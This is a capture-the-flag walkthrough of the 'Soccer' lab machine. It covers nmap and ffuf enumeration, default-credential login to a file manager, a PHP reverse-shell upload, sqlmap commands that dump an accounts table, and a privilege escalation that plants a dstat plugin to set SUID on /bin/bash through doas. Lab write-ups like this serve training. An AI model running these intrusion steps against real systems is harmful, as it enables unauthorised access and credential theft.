# Soccer!
## @Author : M3tr1c_r00t
![banner](https://camo.githubusercontent.com/073e235e265e93e1e82e40688aa2678086f81f0db993d0771d9ea43073b6f943/68747470733a2f2f692e696d6775722e636f6d2f6f647667306e732e706e67)
Soccer is an easy linux machine where you dump creds from an sql database to gain user priviledges and exploit the doas binary to root.

### Enumeration...
***Nmap...***
```
# Nmap 7.92 scan initiated Sun Dec 18 06:02:09 2022 as: nmap -sC -sV -A -p 22,80,9091 -oN nmapports.txt 10.129.87.122
Nmap scan report for 10.129.87.122
Host is up (0.24s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Sun, 18 Dec 2022 03:01:58 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sun, 18 Dec 2022 03:01:59 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   234.01 ms 10.10.14.1
2   235.04 ms 10.129.87.122

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec 18 06:02:50 2022 -- 1 IP address (1 host up) scanned in 41.42 seconds

```
We can visit the web-server and get a look at it...
![](https://camo.githubusercontent.com/f4aad111594a8025b94345372a5f5c2f2e494a6e0e2260b75ac993d84024bc31/68747470733a2f2f692e696d6775722e636f6d2f595670587177372e6a7067)

***Ffuf scan...***
```
ffuf -u http://soccer.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://soccer.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 246ms]
# directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 247ms]
#                       [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 247ms]
# Copyright 2007 James Fisher [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 248ms]
# Priority ordered case insensative list, where entries were found  [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 249ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 249ms]
# on atleast 2 different hosts [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 249ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 250ms]
#                       [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 250ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 250ms]
                        [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 251ms]
#                       [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 252ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 239ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 239ms]
tiny                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 234ms]

```

#### Access as www-data...
![](https://camo.githubusercontent.com/cb260cd3cbf069858f0ea8d5c1837f0ce9a318ed6b9fb05cefa571c51d014284/68747470733a2f2f692e696d6775722e636f6d2f77484a37327a692e706e67)

Seeing this manager framework, i went to google and found its default creds which gave me initial access...
![](https://camo.githubusercontent.com/ef7fabe3fd8b61faad523f421a4967c27848f860c633843bf8b6dba6020d387a/68747470733a2f2f692e696d6775722e636f6d2f394c444e6a38672e706e67)
Now, we can upload files to the manager...
![](https://camo.githubusercontent.com/712f804b30d8f8c5e371f37781517f8a26c4eb23de2aecb1917eea9133a515ac/68747470733a2f2f692e696d6775722e636f6d2f516256736f466c2e706e67)
With that, we can now upload files to the tiny directory.
<br> So, we can upload a php reverse shell...
![](https://camo.githubusercontent.com/0767eef0973e94c89042f6ec0cf728da78c6bb937b40de413987f976587db40c/68747470733a2f2f692e696d6775722e636f6d2f64743035766e482e706e67)
Get from payloadsallthethings github...
![](https://camo.githubusercontent.com/4a13049534ff767cf8df09d537233490ed14278b29c237de0512141e48b83ce7/68747470733a2f2f692e696d6775722e636f6d2f435a6e7a4361332e706e67)
Next, set up your listener then run the phprevscript....
![](https://camo.githubusercontent.com/e104b53149440dbb4d1e6c0e52a34783b140e686f2a619142f0bf2d2b5fc2e5f/68747470733a2f2f692e696d6775722e636f6d2f72427761434c682e706e67)

#### User Access...
While in the machine, i found some creds to a sql database...
<br> With that, i looked at the box's open ports and found an internal database...
![](https://camo.githubusercontent.com/9593af8cce39e49bdebb66c651243927312eed03aca636ca42d19f8c02504d4e/68747470733a2f2f692e696d6775722e636f6d2f414c354d7a565a2e706e67)
(I was playing a K.O.T.H game, hence the lower left terminal ':)')
So that i could try and dump the database, i first connected the machine to chisel, then ran sqlmap against the port ...
```
refernces:

<ambassador>
https://ap3x.github.io/posts/pivoting-with-chisel/
```
![](https://camo.githubusercontent.com/5f362d3bbda39f31be8b93de1e072f1877ba6d2288a229e69f03c4ea4f35b3a8/68747470733a2f2f692e696d6775722e636f6d2f4c455a4b4873372e706e67)
Sqlmap verifies that the databse is vulnerable and we can do a dump...
```
sqlmap -u "http://localhost:8081/?id=1" --batch -dbs
```
![](https://camo.githubusercontent.com/2d28ffe7d7274b19ed5022293f9b9849a990f7f05d4240e27bf18e2fbdff3c23/68747470733a2f2f692e696d6775722e636f6d2f49747166574e472e706e67)
Now, dump the database...
you can also check out the databases qualities using...
```
sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -tables
sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -columns

```
Dumping ...
```
 sqlmap -u "http://localhost:8081/?id=1" --batch -D soccer_db -T accounts -C username,password -dump
```
![](https://camo.githubusercontent.com/18b94d1c6c4c003aa8d9a2fd81ceae59882d2e4d55c3c24671768268e4ab2dbd/68747470733a2f2f692e696d6775722e636f6d2f4e4653414c7a762e706e67)
And we've gotten the creds...
### Priv Esc...
Checking out the suid files...
```
player@soccer:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
```
We can see there's a doas binary...
<br> Also, in the /usr/local/etc/ directory, we find a doas.conf file which allows the user to run the doas binary without root password as root...
```
player@soccer:/usr/local/etc$ cat doas.conf 
permit nopass player as root cmd /usr/bin/dstat
```
It also tells us that we can run dstat as root...
![](https://camo.githubusercontent.com/8588f3ad776875c71ae2a8698a66d67d84be3ab536313081f21019c1244c9e1e/68747470733a2f2f692e696d6775722e636f6d2f486e76786d50392e706e67)
After a bit of googling, we find that dstat has plugins...
![](https://camo.githubusercontent.com/b6bada500cc0ead494d9b5789cab6df6d5413ba55bc52bb9c21cea9129ea7025/68747470733a2f2f692e696d6775722e636f6d2f396d68544f795a2e706e67)
It says that a person can create thier own plugin for dstat, and with that, we have our entry point...

Another good thing, we have write permissions in dsats plugin directory...
```
player@soccer:~$ ls -la /usr/local/share/dstat
drwxrwx--- 2 root player 4096 Dec 12 14:53 .
drwxr-xr-x 6 root root   4096 Nov 17 09:16 ..
```
We can then create a python script that returns the bash suid capabilities...
```
player@soccer:/usr/local/share/dstat$ echo 'import os;os.system("chmod u+s /bin/bash")' > dstat_privesc.py

```
![](https://camo.githubusercontent.com/67b42a0ea41691813ff97f3e9a52715074f4bf5895be194a95f772af35e18890/68747470733a2f2f692e696d6775722e636f6d2f767577706e34312e6a7067)



```
player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --privesc &>/dev/null
```
After that, run the script...
<br> Then type bash -p and we are root!

Done!
### Socials
@Instagram:https://instagram.com/M3tr1c_r00t
<br>@Twitter:https://twitter.com/M3tr1c_root
